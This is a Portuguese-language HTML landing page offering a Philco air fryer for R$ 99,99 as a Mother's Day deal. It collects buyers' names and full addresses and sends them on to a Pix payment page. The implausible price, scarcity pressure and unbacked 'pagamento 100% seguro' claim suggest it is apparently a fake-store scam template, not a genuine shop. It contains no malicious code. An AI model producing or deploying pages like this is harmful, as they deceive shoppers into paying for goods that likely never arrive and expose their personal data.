
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Airfryer por R$ 99,99 - Oferta Imperdível!</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <header class="hero pulse">
    <h1>🔥 Super Oferta Dia das Mães 🔥</h1>
    <p class="highlight">Airfryer Philco por <span class="price">R$ 99,99</span></p>
    <p class="urgency">⏳ Estoque Limitado · Envio Imediato</p>
  </header>

  <main class="container">
    <section class="gallery animated">
      <div class="image-card"><img src="airfry1.jpeg" alt="Airfryer vista frontal"></div>
      <div class="image-card"><img src="airfry2.jpeg" alt="Airfryer aberta com cesto"></div>
      <div class="image-card"><img src="airfry3.jpeg" alt="Airfryer com batatas fritas"></div>
    </section>

    <section class="form-section">
      <h2>🚚 Entrega para todo Brasil</h2>
      <p>Preencha seus dados e garanta já o seu presente de Dia das Mães!</p>
      <form action="pix.html" method="GET">
        <div class="form-group">
          <input type="text" name="nome" placeholder="Nome completo" required />
          <input type="text" name="endereco" placeholder="Rua / Avenida" required />
        </div>
        <div class="form-group">
          <input type="text" name="numero" placeholder="Número" required />
          <input type="text" name="complemento" placeholder="Complemento (opcional)" />
        </div>
        <div class="form-group">
          <input type="text" name="bairro" placeholder="Bairro" required />
          <input type="text" name="cidade" placeholder="Cidade" required />
        </div>
        <div class="form-group">
          <input type="text" name="uf" placeholder="UF" maxlength="2" required />
          <input type="text" name="cep" placeholder="CEP" pattern="\d{5}-?\d{3}" required />
        </div>
        <button type="submit" class="cta-button">🎁 Quero Comprar Agora</button>
      </form>
    </section>
  </main>

  <footer>
    <p>✔️ Pagamento 100% seguro · 📦 Entrega com Código de Rastreamento</p>
  </footer>
</body>
</html>
